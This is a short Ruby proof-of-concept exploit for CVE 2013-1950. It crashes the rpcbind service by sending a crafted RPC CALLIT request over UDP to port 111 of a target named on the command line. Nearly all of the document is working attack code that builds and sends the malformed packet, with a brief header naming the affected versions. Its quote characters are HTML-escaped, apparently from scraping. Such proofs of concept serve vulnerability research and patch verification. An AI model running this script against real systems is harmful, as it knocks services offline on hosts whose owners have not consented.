#
#   rpcbind_udp_crash_poc.rb
#   07/15/2013
#   Sean Verity <veritysr1980 [at] gmail.com>
#   CVE 2013-1950
#
#   rpcbind (CALLIT Procedure) UDP Crash PoC
#   Affected Software Package: rpcbind-0.2.0-19
#
#   Tested on:
#   Fedora 17 (3.9.8-100.fc17.x86_64 #1 SMP)
#   CentOS 6.3 Final (2.6.32-279.22.1.el6.x86_64 #1 SMP)
#
#   rpcbind can be crashed by setting the argument length
#   value > 8944 in an RPC CALLIT procedure request over UDP.
#
 
require &#039;socket&#039;
 
def usage
    abort "\nusage: ./rpcbind_udp_crash_poc.rb <target>\n\n"
end
 
if ARGV.length == 1
    pkt = [rand(2**32)].pack(&#039;N&#039;)   # XID
    pkt << [0].pack(&#039;N&#039;)          # Message Type: CALL (0)
    pkt << [2].pack(&#039;N&#039;)          # RPC Version: 2
    pkt << [100000].pack(&#039;N&#039;)     # Program: Portmap (100000)
    pkt << [2].pack(&#039;N&#039;)          # Program Version: 2
    pkt << [5].pack(&#039;N&#039;)          # Procedure: CALLIT (5)
    pkt << [0].pack(&#039;N&#039;)          # Credentials Flavor: AUTH_NULL (0)
    pkt << [0].pack(&#039;N&#039;)          # Length: 0
    pkt << [0].pack(&#039;N&#039;)          # Credentials Verifier: AUTH_NULL (0)
    pkt << [0].pack(&#039;N&#039;)          # Length: 0
    pkt << [0].pack(&#039;N&#039;)          # Program: Unknown (0)
    pkt << [1].pack(&#039;N&#039;)          # Version: 1
    pkt << [1].pack(&#039;N&#039;)          # Procedure: 1
    pkt << [8945].pack(&#039;N&#039;)           # Argument Length
    pkt << "crash"                    # Arguments
 
    s = UDPSocket.new
    s.send(pkt, 0, ARGV[0], 111)
else
    usage
end

